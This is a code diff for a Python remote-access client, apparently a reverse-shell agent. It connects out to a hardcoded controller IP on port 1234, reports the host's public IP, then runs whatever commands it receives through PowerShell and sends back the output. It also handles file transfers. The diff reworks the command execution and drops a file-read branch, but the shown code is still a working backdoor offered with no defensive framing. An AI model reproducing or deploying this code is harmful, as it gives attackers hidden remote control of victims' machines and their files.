@@ -32,23 +32,23 @@ def execute_command(command):
         if command.startswith("cd"):
             os.chdir(command[3:].strip())
             return "Directory changed to " + os.getcwd()
-        elif command.startswith("get"):
-            file_path = command[4:].strip().replace("`", "")
-            if os.path.exists(file_path):
-                with open(file_path, "rb") as file:
-                    return file.read()
-            else:
-                return f"File not found at path: {file_path}"
         else:
-            output = subprocess.check_output(["powershell", command], shell=True, stderr=subprocess.STDOUT, text=True)
-            return output
-    except subprocess.CalledProcessError as e:
+            process = subprocess.Popen(["powershell", "-Command", "& {" + command + "}"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+            output, error = process.communicate()
+            if output:
+                return output.decode('utf-8')
+            elif error:
+                return error.decode('utf-8')
+            else:
+                return "No output or error returned from PowerShell"
+    except Exception as e:
         return str(e)
+
 
 
 def main():
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client.connect(('192.168.68.107', 1234))  # Replace 'server_ip' with the actual server IP address
+    client.connect(('192.168.68.104', 1234))  # Replace 'server_ip' with the actual server IP address
 
     # Get the public IP address
     public_ip = get_public_ip()
@@ -59,8 +59,6 @@ def main():
     client.send(public_ip.encode('utf-8'))
 
     while True:
-        # Receive selected_agent from the server
-        selected_agent = client.recv(4096).decode('utf-8')
 
         command = client.recv(4096).decode('utf-8')
         if command.lower() == 'exit':
@@ -74,19 +72,18 @@ def main():
             file_path = command[5:].strip().replace("`", "")
             receive_file_from_client(client, file_path)
             client.send("File upload complete".encode('utf-8'))
-        else:
-            output = execute_command(command)
-            if isinstance(output, bytes):
-                client.send(output)
-                acknowledgment = client.recv(4096).decode('utf-8')
-                print(acknowledgment)
-                if acknowledgment == "File received successfully":
-                    client.send("next_menu".encode('utf-8'))
-                else:
-                    print("Error receiving file acknowledgment.")
-                    break
+        output = execute_command(command)
+        if isinstance(output, bytes):
+            client.send(output)
+            acknowledgment = client.recv(4096).decode('utf-8')
+            print(acknowledgment)
+            if acknowledgment == "File received successfully":
+                client.send("next_menu".encode('utf-8'))
             else:
-                client.send(output.encode('utf-8'))
+                print("Error receiving file acknowledgment.")
+                break
+        else:
+            client.send(output.encode('utf-8'))
 
     client.close()
 
